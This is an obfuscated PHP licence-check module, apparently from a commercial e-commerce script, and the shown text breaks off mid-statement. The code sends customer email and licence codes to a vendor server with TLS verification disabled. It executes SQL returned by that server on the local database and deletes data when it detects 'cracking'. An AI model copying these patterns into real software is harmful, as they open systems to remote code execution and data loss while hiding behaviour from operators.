<?php
/*
* Copyright (C) Incevio Systems, Inc - All Rights Reserved
* Unauthorized copying of this file, via any medium is strictly prohibited
* Proprietary and confidential
* Written by Munna Khan <help.zcart@gmail.com>, September 2018
*/
 function aplCustomEncrypt($string, $key) { $encrypted_string = null; if (!(!empty($string) && !empty($key))) { goto FXc1C; } $iv = openssl_random_pseudo_bytes(openssl_cipher_iv_length("\141\x65\163\55\x32\65\66\55\x63\x62\143")); $encrypted_string = openssl_encrypt($string, "\x61\x65\x73\55\x32\65\66\55\x63\x62\143", $key, 0, $iv); $encrypted_string = base64_encode($encrypted_string . "\x3a\x3a" . $iv); FXc1C: return $encrypted_string; } function aplCustomDecrypt($string, $key) { $decrypted_string = null; if (!(!empty($string) && !empty($key))) { goto N_zxW; } $string = base64_decode($string); if (!stristr($string, "\x3a\x3a")) { goto C1wsM; } $string_iv_array = explode("\72\72", $string, 2); if (!(!empty($string_iv_array) && count($string_iv_array) == 2)) { goto UMCh1; } list($encrypted_string, $iv) = $string_iv_array; $decrypted_string = openssl_decrypt($encrypted_string, "\141\145\x73\x2d\62\x35\x36\x2d\143\142\x63", $key, 0, $iv); UMCh1: C1wsM: N_zxW: return $decrypted_string; } function aplValidateIntegerValue($number, $min_value = 0, $max_value = INF) { $result = false; if (!(!is_float($number) && filter_var($number, FILTER_VALIDATE_INT, array("\x6f\x70\164\151\157\x6e\x73" => array("\x6d\x69\x6e\x5f\x72\x61\x6e\147\x65" => $min_value, "\x6d\x61\x78\x5f\162\x61\156\147\x65" => $max_value))) !== false)) { goto QaYcU; } $result = true; QaYcU: return $result; } function aplValidateRawDomain($url) { $result = false; if (empty($url)) { goto nLfjd; } if (preg_match("\57\136\x5b\141\x2d\x7a\x30\55\71\x2d\x2e\x5d\x2b\x5c\x2e\133\141\55\172\134\x2e\135\x7b\x32\54\x37\x7d\x24\x2f", strtolower($url))) { goto wv2xK; } $result = false; goto MUFx1; wv2xK: $result = true; MUFx1: nLfjd: return $result; } function aplGetCurrentUrl($remove_last_slash = null) { $protocol = "\150\x74\x74\x70"; $host = null; $script = null; $params = null; $current_url = null; if (!(isset($_SERVER["\x48\x54\124\x50\123"]) && $_SERVER["\x48\124\x54\120\x53"] !== "\157\146\x66" || isset($_SERVER["\110\x54\124\x50\x5f\x58\137\x46\x4f\122\127\x41\122\x44\x45\104\x5f\x50\122\117\x54\x4f"]) && $_SERVER["\110\124\x54\x50\x5f\130\x5f\x46\x4f\122\x57\x41\x52\104\x45\x44\x5f\x50\x52\117\x54\117"] == "\150\x74\x74\160\163")) { goto VTMTO; } $protocol = "\x68\x74\164\x70\163"; VTMTO: if (!isset($_SERVER["\110\124\124\120\x5f\110\x4f\123\x54"])) { goto aoE9Q; } $host = $_SERVER["\x48\x54\124\120\x5f\x48\x4f\123\x54"]; aoE9Q: if (!isset($_SERVER["\x53\x43\x52\111\120\x54\x5f\x4e\x41\115\x45"])) { goto zH1EP; } $script = $_SERVER["\123\x43\x52\x49\x50\x54\x5f\x4e\101\115\105"]; zH1EP: if (!isset($_SERVER["\121\125\105\x52\x59\137\x53\124\x52\x49\116\107"])) { goto hmr5l; } $params = $_SERVER["\121\125\105\x52\131\137\x53\x54\122\x49\x4e\107"]; hmr5l: if (!(!empty($protocol) && !empty($host) && !empty($script))) { goto h0fCj; } $current_url = $protocol . "\72\x2f\57" . $host . $script; if (empty($params)) { goto YOcuD; } $current_url .= "\77" . $params; YOcuD: if (!($remove_last_slash == 1)) { goto n2xO9; } yQWBq: if (!(substr($current_url, -1) == "\x2f")) { goto YX2u2; } $current_url = substr($current_url, 0, -1); goto yQWBq; YX2u2: n2xO9: h0fCj: return $current_url; } function aplGetRawDomain($url) { $raw_domain = null; if (empty($url)) { goto I8z3m; } $url_array = parse_url($url); if (!empty($url_array["\163\x63\150\145\155\x65"])) { goto qG7ff; } $url = "\150\164\x74\x70\72\x2f\x2f" . $url; $url_array = parse_url($url); qG7ff: if (empty($url_array["\x68\x6f\163\x74"])) { goto iT0Dy; } $raw_domain = $url_array["\150\157\163\164"]; $raw_domain = trim(str_ireplace("\x77\167\167\56", '', filter_var($raw_domain, FILTER_SANITIZE_URL))); iT0Dy: I8z3m: return $raw_domain; } function aplGetRootUrl($url, $remove_scheme, $remove_www, $remove_path, $remove_last_slash) { if (!filter_var($url, FILTER_VALIDATE_URL)) { goto EGuAD; } $url_array = parse_url($url); $url = str_ireplace($url_array["\163\x63\x68\145\155\145"] . "\72\57\57", '', $url); if ($remove_path == 1) { goto RRcIM; } $last_slash_position = strripos($url, "\x2f"); if (!($last_slash_position > 0)) { goto lo8Q2; } $url = substr($url, 0, $last_slash_position + 1); lo8Q2: goto wyKjj; RRcIM: $first_slash_position = stripos($url, "\x2f"); if (!($first_slash_position > 0)) { goto H9ea2; } $url = substr($url, 0, $first_slash_position + 1); H9ea2: wyKjj: if (!($remove_scheme != 1)) { goto PJxot; } $url = $url_array["\163\143\150\x65\155\145"] . "\72\x2f\x2f" . $url; PJxot: if (!($remove_www == 1)) { goto GgXK_; } $url = str_ireplace("\167\x77\167\x2e", '', $url); GgXK_: if (!($remove_last_slash == 1)) { goto vFnop; } RK7op: if (!(substr($url, -1) == "\57")) { goto oecWz; } $url = substr($url, 0, -1); goto RK7op; oecWz: vFnop: EGuAD: return trim($url); } function aplCustomPost($url, $post_info = null, $refer = null) { $user_agent = "\x70\150\x70\155\151\154\x6c\151\x6f\156\40\143\x55\122\x4c"; $connect_timeout = 10; $server_response_array = array(); $formatted_headers_array = array(); if (!(filter_var($url, FILTER_VALIDATE_URL) && !empty($post_info))) { goto i6vJO; } if (!(empty($refer) || !filter_var($refer, FILTER_VALIDATE_URL))) { goto saJSh; } $refer = $url; saJSh: $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_USERAGENT, $user_agent); curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $connect_timeout); curl_setopt($ch, CURLOPT_TIMEOUT, $connect_timeout); curl_setopt($ch, CURLOPT_REFERER, $refer); curl_setopt($ch, CURLOPT_POST, 1); curl_setopt($ch, CURLOPT_POSTFIELDS, $post_info); curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0); curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1); curl_setopt($ch, CURLOPT_MAXREDIRS, 10); curl_setopt($ch, CURLOPT_HEADERFUNCTION, function ($curl, $header) use(&$formatted_headers_array) { $len = strlen($header); $header = explode("\x3a", $header, 2); if (!(count($header) < 2)) { goto Xlzbb; } return $len; Xlzbb: $name = strtolower(trim($header[0])); $formatted_headers_array[$name] = trim($header[1]); return $len; }); $result = curl_exec($ch); $curl_error = curl_error($ch); curl_close($ch); $server_response_array["\x68\x65\141\x64\145\x72\x73"] = $formatted_headers_array; $server_response_array["\145\x72\x72\157\x72"] = $curl_error; $server_response_array["\142\x6f\x64\171"] = $result; i6vJO: return $server_response_array; } function aplVerifyDateTime($datetime, $format) { $result = false; if (!(!empty($datetime) && !empty($format))) { goto uyCq6; } $datetime = DateTime::createFromFormat($format, $datetime); $errors = DateTime::getLastErrors(); if (!($datetime && empty($errors["\x77\141\162\156\151\156\147\x5f\143\x6f\165\156\x74"]))) { goto cJkrz; } $result = true; cJkrz: uyCq6: return $result; } function aplGetDaysBetweenDates($date_from, $date_to) { $number_of_days = 0; if (!(aplVerifyDateTime($date_from, "\x59\x2d\x6d\x2d\x64") && aplVerifyDateTime($date_to, "\131\x2d\155\x2d\144"))) { goto eLTnV; } $date_to = new DateTime($date_to); $date_from = new DateTime($date_from); $number_of_days = $date_from->diff($date_to)->format("\x25\x61"); eLTnV: return $number_of_days; } function aplParseXmlTags($content, $tag_name) { $parsed_value = null; if (!(!empty($content) && !empty($tag_name))) { goto pf_Ac; } preg_match_all("\57\x3c" . preg_quote($tag_name, "\57") . "\x3e\x28\56\52\77\x29\74\x5c\x2f" . preg_quote($tag_name, "\x2f") . "\x3e\57\151\x6d\x73", $content, $output_array, PREG_SET_ORDER); if (empty($output_array[0][1])) { goto oDLgO; } $parsed_value = trim($output_array[0][1]); oDLgO: pf_Ac: return $parsed_value; } function aplParseServerNotifications($content_array, $ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE, $product = Null) { $notifications_array = array(); if (!empty($content_array)) { goto mueVj; } $notifications_array["\156\x6f\x74\151\x66\151\x63\141\x74\x69\x6f\156\137\x63\141\x73\x65"] = "\x6e\x6f\164\x69\x66\x69\x63\x61\164\151\x6f\x6e\137\156\157\137\143\157\156\156\145\143\164\x69\x6f\x6e"; $notifications_array["\x6e\x6f\x74\151\146\x69\x63\141\164\x69\157\156\x5f\x74\145\x78\164"] = APL_NOTIFICATION_NO_CONNECTION; goto olBek; mueVj: if (!empty($content_array["\x68\145\141\144\145\x72\x73"]["\156\157\164\151\x66\x69\x63\141\164\151\157\x6e\x5f\x73\x65\162\x76\145\x72\x5f\163\151\147\156\141\164\x75\x72\145"]) && aplVerifyServerSignature($content_array["\150\x65\x61\144\x65\162\163"]["\156\x6f\164\x69\146\x69\143\141\164\x69\x6f\156\137\x73\x65\162\x76\145\162\137\163\x69\x67\x6e\141\164\x75\x72\145"], $ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE, $product)) { goto vUm8D; } $notifications_array["\x6e\x6f\164\151\x66\x69\143\141\164\x69\157\156\137\143\x61\x73\x65"] = "\156\x6f\164\x69\146\151\x63\x61\x74\x69\157\x6e\x5f\151\156\x76\141\154\151\144\x5f\x72\145\x73\160\157\156\163\x65"; $notifications_array["\x6e\157\164\151\x66\151\x63\141\164\x69\x6f\x6e\x5f\164\145\x78\164"] = APL_NOTIFICATION_INVALID_RESPONSE; goto aGIs9; vUm8D: $notifications_array["\156\x6f\x74\x69\146\151\x63\141\x74\x69\157\x6e\137\x63\141\163\x65"] = $content_array["\150\x65\x61\x64\145\x72\x73"]["\x6e\x6f\164\151\x66\x69\x63\x61\164\151\x6f\x6e\x5f\x63\141\x73\145"]; $notifications_array["\x6e\x6f\164\151\146\x69\143\141\x74\x69\157\x6e\x5f\x74\x65\170\164"] = $content_array["\x68\145\x61\144\x65\162\163"]["\156\x6f\164\151\x66\151\x63\141\164\151\x6f\x6e\137\x74\x65\170\x74"]; if (empty($content_array["\150\145\x61\x64\145\x72\163"]["\x6e\x6f\x74\151\x66\151\143\141\164\x69\157\156\137\144\141\x74\141"])) { goto bhSyt; } $notifications_array["\156\x6f\x74\x69\x66\151\x63\141\164\151\x6f\156\137\144\x61\x74\141"] = json_decode($content_array["\x68\x65\x61\x64\x65\162\x73"]["\156\157\164\151\x66\x69\x63\x61\x74\x69\x6f\156\137\144\x61\164\141"], true); bhSyt: aGIs9: olBek: return $notifications_array; } function aplGenerateScriptSignature($ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE, $product = Null) { $script_signature = null; $root_ips_array = gethostbynamel(aplGetRawDomain(APL_ROOT_URL)); $product = $product == Null ? APL_PRODUCT_ID : $product; if (!(!empty($ROOT_URL) && isset($CLIENT_EMAIL) && isset($LICENSE_CODE) && !empty($root_ips_array))) { goto HO0CF; } $script_signature = hash("\x73\x68\141\x32\x35\66", gmdate("\131\x2d\155\x2d\144") . $ROOT_URL . $CLIENT_EMAIL . $LICENSE_CODE . $product . implode('', $root_ips_array)); HO0CF: return $script_signature; } function aplVerifyServerSignature($notification_server_signature, $ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE, $product = Null) { $result = false; $root_ips_array = gethostbynamel(aplGetRawDomain(APL_ROOT_URL)); $product = $product == Null ? APL_PRODUCT_ID : $product; if (!(!empty($notification_server_signature) && !empty($ROOT_URL) && isset($CLIENT_EMAIL) && isset($LICENSE_CODE) && !empty($root_ips_array))) { goto MjGqs; } if (!(hash("\163\x68\141\62\x35\66", implode('', $root_ips_array) . $product . $LICENSE_CODE . $CLIENT_EMAIL . $ROOT_URL . gmdate("\x59\x2d\x6d\x2d\x64")) == $notification_server_signature)) { goto BVwEq; } $result = true; BVwEq: MjGqs: return $result; } function aplCheckSettings() { $notifications_array = array(); if (!(empty(APL_SALT) || APL_SALT == "\x73\157\155\145\x5f\x72\x61\x6e\144\157\x6d\x5f\x74\145\170\x74")) { goto J7pFb; } $notifications_array[] = APL_CORE_NOTIFICATION_INVALID_SALT; J7pFb: if (!(!filter_var(APL_ROOT_URL, FILTER_VALIDATE_URL) || !ctype_alnum(substr(APL_ROOT_URL, -1)))) { goto Bi7Dz; } $notifications_array[] = APL_CORE_NOTIFICATION_INVALID_ROOT_URL; Bi7Dz: if (filter_var(APL_PRODUCT_ID, FILTER_VALIDATE_INT)) { goto pUrNO; } $notifications_array[] = APL_CORE_NOTIFICATION_INVALID_PRODUCT_ID; pUrNO: if (aplValidateIntegerValue(APL_DAYS, 1, 365)) { goto PEiA6; } $notifications_array[] = APL_CORE_NOTIFICATION_INVALID_VERIFICATION_PERIOD; PEiA6: if (!(APL_STORAGE != "\x44\x41\124\x41\x42\x41\x53\105" && APL_STORAGE != "\106\x49\x4c\105")) { goto sfgMQ; } $notifications_array[] = APL_CORE_NOTIFICATION_INVALID_STORAGE; sfgMQ: if (!(APL_STORAGE == "\x44\101\124\x41\102\101\x53\x45" && !ctype_alnum(str_ireplace(array("\137"), '', APL_DATABASE_TABLE)))) { goto c1v5N; } $notifications_array[] = APL_CORE_NOTIFICATION_INVALID_TABLE; c1v5N: if (!(APL_STORAGE == "\x46\111\x4c\x45" && !@is_writable(APL_DIRECTORY . "\x2f" . APL_LICENSE_FILE_LOCATION))) { goto ughvw; } $notifications_array[] = APL_CORE_NOTIFICATION_INVALID_LICENSE_FILE; ughvw: if (!(!empty(APL_ROOT_IP) && !filter_var(APL_ROOT_IP, FILTER_VALIDATE_IP))) { goto Z65Dd; } $notifications_array[] = APL_CORE_NOTIFICATION_INVALID_ROOT_IP; Z65Dd: if (!(!empty(APL_ROOT_IP) && !in_array(APL_ROOT_IP, gethostbynamel(aplGetRawDomain(APL_ROOT_URL))))) { goto nb5o2; } $notifications_array[] = APL_CORE_NOTIFICATION_INVALID_DNS; nb5o2: if (!(defined("\x41\120\114\137\x52\x4f\x4f\x54\137\116\101\115\105\x53\x45\122\126\x45\122\x53") && !empty(APL_ROOT_NAMESERVERS))) { goto O3Nsm; } foreach (APL_ROOT_NAMESERVERS as $nameserver) { if (aplValidateRawDomain($nameserver)) { goto vZ_pi; } $notifications_array[] = APL_CORE_NOTIFICATION_INVALID_ROOT_NAMESERVERS; goto b9kI3; vZ_pi: NarLW: } b9kI3: O3Nsm: if (!(defined("\101\x50\114\137\x52\117\117\124\137\x4e\101\x4d\105\x53\x45\122\126\x45\122\x53") && !empty(APL_ROOT_NAMESERVERS))) { goto cKuY0; } $apl_root_nameservers_array = APL_ROOT_NAMESERVERS; $fetched_nameservers_array = array(); $dns_records_array = dns_get_record(aplGetRawDomain(APL_ROOT_URL), DNS_NS); foreach ($dns_records_array as $record) { $fetched_nameservers_array[] = $record["\164\141\162\147\145\x74"]; TK2bZ: } h6eUo: $apl_root_nameservers_array = array_map("\163\x74\x72\164\x6f\x6c\157\167\145\x72", $apl_root_nameservers_array); $fetched_nameservers_array = array_map("\x73\164\162\x74\x6f\154\x6f\167\x65\162", $fetched_nameservers_array); sort($apl_root_nameservers_array); sort($fetched_nameservers_array); if (!($apl_root_nameservers_array != $fetched_nameservers_array)) { goto vTmTp; } $notifications_array[] = APL_CORE_NOTIFICATION_INVALID_DNS; vTmTp: cKuY0: return $notifications_array; } function aplParseLicenseFile() { $license_data_array = array(); if (!@is_readable(APL_DIRECTORY . "\x2f" . APL_LICENSE_FILE_LOCATION)) { goto DKjIm; } $file_content = file_get_contents(APL_DIRECTORY . "\57" . APL_LICENSE_FILE_LOCATION); preg_match_all("\57\x3c\50\x5b\101\55\x5a\x5f\x5d\53\51\76\50\56\52\x3f\x29\74\x5c\x2f\x28\133\x41\x2d\132\x5f\135\x2b\x29\76\x2f", $file_content, $matches, PREG_SET_ORDER); if (empty($matches)) { goto Ra5Ki; } foreach ($matches as $value) { if (!(!empty($value[1]) && $value[1] == $value[3])) { goto qCimD; } $license_data_array[$value[1]] = $value[2]; qCimD: pK39c: } iPu2_: Ra5Ki: DKjIm: return $license_data_array; } function aplGetLicenseData($MYSQLI_LINK = null) { $settings_row = array(); if (!(APL_STORAGE == "\x44\x41\124\x41\x42\101\123\105")) { goto hqxot; } $table_exist = @mysqli_query($MYSQLI_LINK, "\123\110\x4f\127\40\x54\x41\102\x4c\105\123\x20\x4c\x49\113\105\x20\x27" . APL_DATABASE_TABLE . "\x27"); if (!@mysqli_fetch_assoc($table_exist)) { goto RJLCZ; } $settings_results = @mysqli_query($MYSQLI_LINK, "\123\x45\114\105\x43\x54\x20\52\x20\x46\x52\x4f\x4d\40" . APL_DATABASE_TABLE); $settings_row = @mysqli_fetch_assoc($settings_results); RJLCZ: hqxot: if (!(APL_STORAGE == "\106\111\x4c\105")) { goto C05Ga; } $settings_row = aplParseLicenseFile(); C05Ga: return $settings_row; } function aplCheckConnection() { $notifications_array = array(); $content_array = aplCustomPost(APL_ROOT_URL . "\x2f\x61\x70\x6c\137\143\x61\154\x6c\142\141\x63\x6b\x73\x2f\x63\157\x6e\x6e\145\x63\x74\x69\157\x6e\x5f\164\145\x73\164\x2e\160\150\x70", "\160\x72\x6f\x64\x75\x63\164\x5f\151\x64\x3d" . rawurlencode(APL_PRODUCT_ID) . "\46\x63\x6f\x6e\x6e\x65\x63\x74\151\157\156\137\150\x61\x73\150\x3d" . rawurlencode(hash("\163\150\x61\62\65\66", "\143\x6f\156\156\145\x63\x74\151\x6f\156\x5f\164\x65\163\x74"))); if (!empty($content_array)) { goto wKYia; } $notifications_array["\x6e\157\164\151\146\151\x63\x61\x74\151\157\x6e\x5f\x63\x61\163\x65"] = "\156\157\x74\151\x66\151\143\141\x74\151\157\156\x5f\x6e\157\x5f\143\x6f\x6e\x6e\x65\x63\x74\151\x6f\x6e"; $notifications_array["\156\x6f\164\151\x66\x69\143\x61\164\x69\157\156\x5f\x74\145\170\164"] = APL_NOTIFICATION_NO_CONNECTION; goto v0tV9; wKYia: if (!($content_array["\x62\x6f\x64\171"] != "\x3c\x63\157\156\x6e\x65\143\x74\x69\x6f\156\x5f\164\145\163\164\x3e\117\x4b\74\57\143\157\x6e\x6e\145\x63\164\x69\x6f\x6e\x5f\x74\145\x73\x74\76")) { goto ZakrF; } $notifications_array["\x6e\x6f\x74\151\x66\x69\x63\141\x74\151\x6f\x6e\x5f\x63\x61\163\x65"] = "\x6e\157\164\151\146\151\143\x61\164\151\x6f\156\x5f\151\156\x76\141\154\x69\x64\137\162\145\x73\160\x6f\x6e\163\x65"; $notifications_array["\x6e\157\x74\x69\x66\x69\143\x61\164\x69\x6f\x6e\x5f\164\145\170\x74"] = APL_NOTIFICATION_INVALID_RESPONSE; ZakrF: v0tV9: return $notifications_array; } function aplCheckData($MYSQLI_LINK = null) { $error_detected = 0; $cracking_detected = 0; $data_check_result = false; extract(aplGetLicenseData($MYSQLI_LINK)); if (!(!empty($ROOT_URL) && !empty($INSTALLATION_HASH) && !empty($INSTALLATION_KEY) && !empty($LCD) && !empty($LRD))) { goto kdZbq; } $LCD = aplCustomDecrypt($LCD, APL_SALT . $INSTALLATION_KEY); $LRD = aplCustomDecrypt($LRD, APL_SALT . $INSTALLATION_KEY); if (!(!filter_var($ROOT_URL, FILTER_VALIDATE_URL) || !ctype_alnum(substr($ROOT_URL, -1)))) { goto LBsb_; } $error_detected = 1; LBsb_: if (!(filter_var(aplGetCurrentUrl(), FILTER_VALIDATE_URL) && stristr(aplGetRootUrl(aplGetCurrentUrl(), 1, 1, 0, 1), aplGetRootUrl("{$ROOT_URL}\x2f", 1, 1, 0, 1)) === false)) { goto m3z1n; } $error_detected = 1; m3z1n: if (!(empty($INSTALLATION_HASH) || $INSTALLATION_HASH != hash("\x73\150\141\62\x35\x36", $ROOT_URL . $CLIENT_EMAIL . $LICENSE_CODE))) { goto NTVwX; } $error_detected = 1; NTVwX: if (!(empty($INSTALLATION_KEY) || !password_verify($LRD, aplCustomDecrypt($INSTALLATION_KEY, APL_SALT . $ROOT_URL)))) { goto qp__Y; } $error_detected = 1; qp__Y: if (aplVerifyDateTime($LCD, "\131\x2d\155\55\x64")) { goto XJxt1; } $error_detected = 1; XJxt1: if (aplVerifyDateTime($LRD, "\x59\55\x6d\x2d\144")) { goto xAcIL; } $error_detected = 1; xAcIL: if (!(aplVerifyDateTime($LCD, "\x59\x2d\155\x2d\x64") && $LCD > date("\x59\x2d\x6d\55\144", strtotime("\x2b\61\40\x64\x61\171")))) { goto g4ux7; } $error_detected = 1; $cracking_detected = 1; g4ux7: if (!(aplVerifyDateTime($LRD, "\x59\x2d\x6d\55\144") && $LRD > date("\x59\55\x6d\55\x64", strtotime("\x2b\x31\40\x64\141\171")))) { goto LMXoc; } $error_detected = 1; $cracking_detected = 1; LMXoc: if (!(aplVerifyDateTime($LCD, "\x59\55\155\x2d\x64") && aplVerifyDateTime($LRD, "\131\x2d\155\55\x64") && $LCD > $LRD)) { goto fmgqD; } $error_detected = 1; $cracking_detected = 1; fmgqD: if (!($cracking_detected == 1 && APL_DELETE_CRACKED == "\x59\105\x53")) { goto sVH2X; } aplDeleteData($MYSQLI_LINK); sVH2X: if (!($error_detected != 1 && $cracking_detected != 1)) { goto gsruP; } $data_check_result = true; gsruP: kdZbq: return $data_check_result; } function aplVerifyEnvatoPurchase($LICENSE_CODE = null) { $notifications_array = array(); $content_array = aplCustomPost(APL_ROOT_URL . "\x2f\141\160\154\x5f\143\x61\x6c\154\x62\x61\143\153\x73\57\166\145\162\x69\x66\171\x5f\145\x6e\x76\141\x74\157\x5f\x70\165\162\x63\150\x61\163\x65\56\x70\150\x70", "\160\162\157\x64\x75\143\164\x5f\x69\144\x3d" . rawurlencode(APL_PRODUCT_ID) . "\46\154\151\x63\x65\x6e\x73\145\137\x63\157\x64\145\x3d" . rawurlencode($LICENSE_CODE) . "\46\x63\157\156\156\145\x63\164\x69\x6f\156\137\x68\141\163\150\x3d" . rawurlencode(hash("\x73\150\141\x32\65\x36", "\x76\145\x72\151\x66\171\137\145\x6e\166\141\164\x6f\137\x70\165\x72\143\x68\141\x73\x65"))); if (!empty($content_array)) { goto MtGAJ; } $notifications_array["\156\x6f\x74\151\x66\x69\x63\x61\164\x69\157\156\x5f\143\141\163\145"] = "\156\157\x74\x69\146\151\143\x61\x74\151\x6f\156\x5f\156\x6f\137\x63\x6f\x6e\156\x65\x63\x74\151\x6f\156"; $notifications_array["\156\x6f\164\151\146\151\x63\x61\x74\x69\157\156\137\x74\x65\x78\164"] = APL_NOTIFICATION_NO_CONNECTION; goto SIlQW; MtGAJ: if (!($content_array["\142\157\144\x79"] != "\x3c\166\x65\x72\151\146\171\x5f\x65\x6e\x76\x61\x74\157\x5f\160\165\162\x63\x68\141\x73\145\x3e\117\x4b\74\x2f\166\145\162\x69\146\x79\x5f\145\x6e\x76\x61\x74\x6f\x5f\160\165\x72\x63\x68\x61\163\x65\x3e")) { goto pfFe4; } $notifications_array["\156\157\x74\151\x66\151\143\x61\x74\x69\157\x6e\137\x63\141\163\145"] = "\156\157\x74\151\146\x69\143\x61\164\151\157\156\137\151\x6e\x76\x61\154\x69\x64\137\x72\x65\x73\x70\157\156\163\x65"; $notifications_array["\x6e\157\164\151\146\x69\x63\141\164\x69\x6f\156\x5f\164\145\170\164"] = APL_NOTIFICATION_INVALID_RESPONSE; pfFe4: SIlQW: return $notifications_array; } function incevioVerify($ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE, $MYSQLI_LINK = null) { $notifications_array = array(); $apl_core_notifications = aplCheckSettings(); if (empty($apl_core_notifications)) { goto zS0PK; } $notifications_array["\156\157\164\x69\x66\151\143\141\164\x69\157\156\137\x63\141\x73\x65"] = "\156\x6f\x74\x69\x66\151\143\x61\164\x69\157\156\x5f\163\x63\x72\x69\x70\x74\x5f\143\157\162\x72\x75\160\x74\145\144"; $notifications_array["\156\157\x74\151\146\x69\x63\x61\x74\x69\x6f\x6e\137\x74\145\x78\x74"] = implode("\73\x20", $apl_core_notifications); goto Ydvmv; zS0PK: if (!empty(aplGetLicenseData($MYSQLI_LINK)) && is_array(aplGetLicenseData($MYSQLI_LINK))) { goto fn9te; } $INSTALLATION_HASH = hash("\163\150\x61\62\x35\66", $ROOT_URL . $CLIENT_EMAIL . $LICENSE_CODE); $post_info = "\160\162\157\x64\x75\143\164\137\151\x64\75" . rawurlencode(APL_PRODUCT_ID) . "\46\143\x6c\x69\x65\156\164\137\145\x6d\x61\151\154\x3d" . rawurlencode($CLIENT_EMAIL) . "\x26\154\x69\143\145\156\x73\x65\x5f\143\157\x64\145\75" . rawurlencode($LICENSE_CODE) . "\46\x72\157\157\164\x5f\165\162\154\x3d" . rawurlencode($ROOT_URL) . "\x26\151\156\163\164\141\154\x6c\x61\x74\x69\157\x6e\137\150\141\x73\150\75" . rawurlencode($INSTALLATION_HASH) . "\46\154\151\143\x65\156\x73\145\137\163\151\x67\156\x61\x74\165\162\145\x3d" . rawurlencode(aplGenerateScriptSignature($ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE)); $content_array = aplCustomPost(APL_ROOT_URL . "\57\x61\x70\x6c\x5f\143\141\x6c\x6c\142\x61\x63\x6b\x73\57\x6c\x69\x63\x65\x6e\163\x65\x5f\x69\x6e\x73\164\x61\x6c\x6c\56\160\x68\160", $post_info, $ROOT_URL); $notifications_array = aplParseServerNotifications($content_array, $ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE); if (!($notifications_array["\156\157\x74\x69\x66\151\143\x61\x74\x69\157\156\x5f\143\141\163\x65"] == "\156\157\x74\151\146\151\143\141\164\x69\157\x6e\x5f\x6c\x69\x63\x65\x6e\x73\145\x5f\x6f\153")) { goto fkL6f; } $INSTALLATION_KEY = aplCustomEncrypt(password_hash(date("\x59\x2d\155\x2d\x64"), PASSWORD_DEFAULT), APL_SALT . $ROOT_URL); $LCD = aplCustomEncrypt(date("\131\x2d\155\x2d\x64", strtotime("\x2d" . APL_DAYS . "\40\144\141\x79\x73")), APL_SALT . $INSTALLATION_KEY); $LRD = aplCustomEncrypt(date("\131\55\x6d\x2d\144"), APL_SALT . $INSTALLATION_KEY); if (!(APL_STORAGE == "\104\x41\x54\x41\x42\x41\x53\x45")) { goto WkOa1; } $content_array = aplCustomPost(APL_ROOT_URL . "\57\x61\x70\x6c\137\x63\x61\154\154\x62\x61\143\153\x73\x2f\x6c\151\x63\145\156\x73\145\x5f\x73\x63\x68\x65\155\145\x2e\160\x68\160", $post_info, $ROOT_URL); $notifications_array = aplParseServerNotifications($content_array, $ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE); if (!(!empty($notifications_array["\x6e\x6f\x74\x69\146\151\143\141\x74\151\157\x6e\x5f\x64\x61\164\x61"]) && !empty($notifications_array["\x6e\157\x74\x69\146\x69\x63\141\x74\151\157\156\x5f\x64\x61\164\141"]["\163\143\x68\x65\155\145\x5f\161\x75\145\162\x79"]))) { goto HZpHb; } $mysql_bad_array = array("\x25\x41\x50\114\137\104\x41\124\x41\102\101\123\105\137\x54\x41\102\114\x45\x25", "\x25\x52\x4f\117\x54\137\x55\122\x4c\x25", "\x25\103\114\x49\x45\x4e\x54\x5f\105\115\101\111\114\45", "\45\x4c\x49\103\x45\116\x53\x45\137\x43\x4f\x44\105\x25", "\45\114\103\x44\x25", "\x25\x4c\x52\x44\45", "\x25\111\x4e\123\x54\x41\114\114\101\x54\111\x4f\116\x5f\x4b\105\x59\x25", "\x25\x49\116\123\124\101\x4c\114\x41\x54\x49\x4f\116\137\x48\x41\x53\x48\x25"); $mysql_good_array = array(APL_DATABASE_TABLE, $ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE, $LCD, $LRD, $INSTALLATION_KEY, $INSTALLATION_HASH); $license_scheme = str_replace($mysql_bad_array, $mysql_good_array, $notifications_array["\x6e\157\164\151\146\151\143\141\164\x69\x6f\x6e\x5f\144\x61\164\x61"]["\163\143\150\145\155\x65\137\161\165\145\x72\x79"]); mysqli_multi_query($MYSQLI_LINK, $license_scheme) or die(mysqli_error($MYSQLI_LINK)); HZpHb: WkOa1: if (!(APL_STORAGE == "\106\111\114\105")) { goto vg36O; } $handle = @fopen(APL_DIRECTORY . "\57" . APL_LICENSE_FILE_LOCATION, "\167\x2b"); $fwrite = @fwrite($handle, "\74\x52\117\x4f\x54\x5f\125\122\114\76{$ROOT_URL}\74\57\122\x4f\117\x54\x5f\125\122\114\x3e\74\x43\x4c\x49\105\x4e\x54\x5f\105\x4d\101\x49\x4c\x3e{$CLIENT_EMAIL}\74\x2f\x43\114\x49\105\x4e\124\x5f\105\115\x41\x49\x4c\x3e\x3c\x4c\x49\103\105\x4e\123\105\137\x43\x4f\x44\105\x3e{$LICENSE_CODE}\74\x2f\x4c\111\x43\x45\x4e\123\x45\x5f\103\117\104\x45\76\x3c\x4c\x43\104\x3e{$LCD}\74\x2f\x4c\103\104\x3e\x3c\114\122\104\x3e{$LRD}\x3c\57\x4c\x52\104\76\74\111\116\123\x54\x41\114\114\x41\x54\x49\117\116\x5f\x4b\x45\131\x3e{$INSTALLATION_KEY}\x3c\57\x49\116\123\x54\101\x4c\x4c\101\124\x49\117\x4e\x5f\113\105\x59\x3e\74\x49\116\x53\124\x41\114\114\101\124\x49\117\116\x5f\x48\101\123\x48\76{$INSTALLATION_HASH}\x3c\x2f\x49\116\123\124\101\114\114\101\x54\x49\x4f\116\x5f\x48\x41\123\110\x3e"); if (!($fwrite === false)) { goto 